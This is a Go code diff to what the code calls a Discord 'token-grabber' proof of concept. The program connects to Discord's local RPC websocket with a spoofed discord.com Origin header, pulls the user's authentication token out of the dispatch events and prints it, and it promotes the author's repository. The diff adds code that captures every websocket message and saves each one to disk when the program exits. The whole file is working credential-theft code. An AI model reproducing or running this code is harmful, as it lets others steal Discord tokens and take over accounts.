@@ -4,6 +4,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
+	"os/signal"
+	"syscall"
 
 	"github.com/gorilla/websocket"
 )
@@ -11,6 +14,7 @@ import (
 var (
 	socketURL = "ws://127.0.0.1:6463/?v=1&encoding=json"
 	headers   = http.Header{}
+	data      [][]byte // part of logging all the data
 )
 
 func initPayload(c *websocket.Conn) {
@@ -58,6 +62,13 @@ func logToken(payload *payloads) {
 	fmt.Println("\nAnyways follow me on github and checkout this repo!\nhttps://github.com/post04\nhttps://github.com/post04/token-grabber-poc")
 }
 
+// part of logging all the data
+func saveAll(d [][]byte) {
+	for i, b := range d {
+		os.WriteFile(fmt.Sprintf("./data/%v.json", i), b, 0064)
+	}
+}
+
 func main() {
 	headers["Origin"] = []string{"https://discord.com"}
 	c, _, err := websocket.DefaultDialer.Dial(socketURL, headers)
@@ -65,26 +76,34 @@ func main() {
 		panic(err)
 	}
 
-	for {
-		_, message, err := c.ReadMessage()
-		if err != nil {
-			c.Close()
-			return
-		}
-		payload := &base{}
-		err = json.Unmarshal(message, &payload)
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-		switch payload.Event {
-		case "READY":
-			fmt.Println("Ready triggered!")
-			initPayload(c)
-		default:
-			if payload.Cmd == "DISPATCH" && payload.Data.Type == "DISPATCH" && payload.Data.PID == 4 {
-				logToken(payload.Data.Payloads[0])
+	go func() {
+		for {
+			_, message, err := c.ReadMessage()
+			if err != nil {
+				c.Close()
+				return
+			}
+			data = append(data, message) // part of logging all the data
+			payload := &base{}
+			err = json.Unmarshal(message, &payload)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+
+			switch payload.Event {
+			case "READY":
+				fmt.Println("Ready triggered!")
+				initPayload(c)
+			default:
+				if payload.Cmd == "DISPATCH" && payload.Data.Type == "DISPATCH" && payload.Data.PID == 4 {
+					logToken(payload.Data.Payloads[0])
+				}
 			}
 		}
-	}
+	}()
+	sc := make(chan os.Signal, 1)
+	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
+	<-sc
+	saveAll(data) // part of logging all the data
 }
